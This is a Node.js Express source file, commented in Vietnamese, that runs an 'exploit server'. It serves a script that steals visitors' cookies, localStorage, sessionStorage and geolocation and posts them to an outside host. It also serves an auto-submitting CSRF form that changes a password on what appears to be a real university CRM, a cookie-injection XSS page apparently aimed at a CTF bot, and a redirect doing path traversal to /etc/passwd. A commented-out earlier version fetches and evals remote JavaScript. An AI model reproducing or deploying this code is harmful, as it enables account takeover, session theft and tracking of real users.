// const express = require("express");
// const fs = require("fs");

// const app = express();
// const PORT = 3006;

// app.use(express.json());



// Middleware bắt dữ liệu POST


// // Route mặc định
// app.get('/', (req, res) => {
//     res.send('Hello, this is a Node.js server!');
// });




// // Bắt đầu lắng nghe trên cổng PORT
// app.listen(PORT, () => {
//     console.log(`Server đang lắng nghe trên http://localhost:${PORT}`);
// });

// const express = require("express");
// const app = express();
// const PORT = 3006;

// app.use((req, res, next) => {
//     if (req.method === 'POST') {
//         console.log('Received POST data:', req.body);
//     }
//     next();
// });

// // Middleware log dữ liệu POST
// app.use(express.json());
// app.use((req, res, next) => {
//   if (req.method === "POST") {
//     console.log("📩 Nhận dữ liệu từ nạn nhân:", req.body);
//   }
//   next();
// });

// // Route mặc định
// app.get("/", (req, res) => {
//   res.send("🚀 Hello, đây là server exploit!");
// });

// // Route tạo file HTML chứa payload auto-fetch shell.js
// app.get("/payload.html", (req, res) => {
//   const htmlPayload = `
//     <!DOCTYPE html>
//     <html>
//       <body>
//         <h1>Welcome to the safe site 😈</h1>
//         <script>
//           fetch("http://localhost:3006/shell.js")
//             .then(res => res.text())
//             .then(shell => eval(shell));
//         </script>
//       </body>
//     </html>
//   `;

//   res.setHeader("Content-Type", "text/html");
//   res.send(htmlPayload);
// });

// // Route shell.js — Thực thi RCE từ client
// app.get("/shell.js", (req, res) => {
//   const shellJS = `
//     // Thông báo nhỏ gọn cho vui (hoặc bỏ đi cho stealth)
//     alert("Bạn đã bị hack!");

//     // Lấy vị trí địa lý của nạn nhân
//     navigator.geolocation.getCurrentPosition((position) => {
//       fetch("https://test-xss.onrender.com/location", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({
//           lat: position.coords.latitude,
//           lon: position.coords.longitude
//         })
//       });
//     });

//     // Đính kèm thêm lấy cookie + localStorage + sessionStorage
//     fetch("https://test-xss.onrender.com/stolen-data", {
//       method: "POST",
//       headers: { "Content-Type": "application/json" },
//       body: JSON.stringify({
//         cookies: document.cookie,
//         localStorage: JSON.stringify(localStorage),
//         sessionStorage: JSON.stringify(sessionStorage)
//       })
//     });
//   `;

//   res.setHeader("Content-Type", "application/javascript");
//   res.send(shellJS);
// });

// // Route nhận dữ liệu vị trí của nạn nhân
// app.post("/location", (req, res) => {
//   console.log("📍 Vị trí nạn nhân:", req.body);
//   res.send("✅ Đã nhận vị trí!");
// });

// // Route nhận cookie, localStorage, sessionStorage từ nạn nhân
// app.post("/stolen-data", (req, res) => {
//   console.log("🔒 Dữ liệu thu thập:", req.body);
//   res.send("✅ Đã thu thập xong dữ liệu!");
// });

// // Khởi chạy server
// app.listen(PORT, () => {
//   console.log(`Server exploit đang chạy tại: http://localhost:${PORT}`);
//   console.log(`⚡ Truy cập payload tại: http://localhost:${PORT}/payload.html`);
// });

const express = require("express");
const app = express();
const PORT = 3006;

// Middleware log request
app.use(express.json());
app.use((req, res, next) => {
  console.log(`[${new Date().toLocaleTimeString()}] ${req.method} request tới: ${req.url}`);
  if (req.method === "POST") console.log("📩 Nhận dữ liệu:", req.body);
  next();
});

// Cấu hình CORS đầy đủ
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

// Route trang chính
app.get("/", (req, res) => res.send("🚀 Hello, đây là server exploit!"));

// Route shell.js — Gửi payload
app.get("/shell.js", (req, res) => {
  const shellJS = `
    alert("Bạn đã bị hack!");

    navigator.geolocation.getCurrentPosition((position) => {
      fetch("https://test-xss.onrender.com/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      });
    });

    fetch("https://test-xss.onrender.com/stolen-data", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
      })
    });
  `;

  res.setHeader("Content-Type", "application/javascript");
  console.log("📡 Gửi shell.js cho nạn nhân!");
  res.send(shellJS);
});

// Route nhận vị trí nạn nhân
app.post("/location", (req, res) => {
  console.log("📍 Vị trí nạn nhân:", req.body);
  res.send("✅ Đã nhận vị trí!");
});

// Route nhận cookie, localStorage, sessionStorage từ nạn nhân
app.post("/stolen-data", (req, res) => {
  console.log("🔒 Dữ liệu thu thập:", req.body);
  res.send("✅ Đã thu thập xong dữ liệu!");
});

app.get("/csrf-form", (req, res) => {
  const html = `
    <html>
  <body>
    <h1>Đang tải...</h1>
    <form id="csrfForm" action="https://crm.aulac.edu.vn/profile" method="POST">
      <input type="password" name="current-password" value="MatKhauCu">
      <input type="password" name="new-password" value="Long@1234">
      <input type="password" name="confirm-password" value="Long@1234">
      <button type="submit">Thay đổi mật khẩu</button>
    </form>

    <script>
      setTimeout(() => document.getElementById("csrfForm").submit(), 2000);
    </script>
  </body>
</html>
  `;
  res.setHeader("Content-Type", "text/html");
  res.send(html);
});

// Route chứa payload XSS để khai thác bot
app.get("/xss.html", (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <body>
      <h1>💥 Bot đang bị khai thác...</h1>

      <script>
        // Ghi cookie chứa XSS payload lên domain hợp lệ
        document.cookie = "password=<img src=x onerror='fetch(\\\`https://test-xss.onrender.com/stolen-data\\\`,{method:\\\`POST\\\`,body:document.cookie})'>; domain=.0ta1gxvglk52d7fsz3gyhr6q6t5go4jo6h7edetlj2yl4cpehlid-h641507400.scf.usercontent.goog; path=/";

        // Redirect bot quay lại game để XSS được thực thi
        setTimeout(() => {
          location.href = "https://game-arcade-web.2024.ctfcompetition.com/#1";
        }, 1000);
      </script>
    </body>
    </html>
  `;
  res.setHeader("Content-Type", "text/html");
  console.log("⚡ Gửi xss.html cho bot!");
  res.send(html);
});

app.get('/redirect', (req, res) => {
  res.redirect('https://ctf-1.hngnh.com/index.php/../../../../../../etc/passwd');
});



  

// Khởi chạy server
app.listen(PORT, () => {
  console.log(`⚡ Server exploit đang chạy tại: http://localhost:${PORT}`);
  console.log(`🔗 Truy cập payload tại: http://localhost:${PORT}/payload.html`);
});




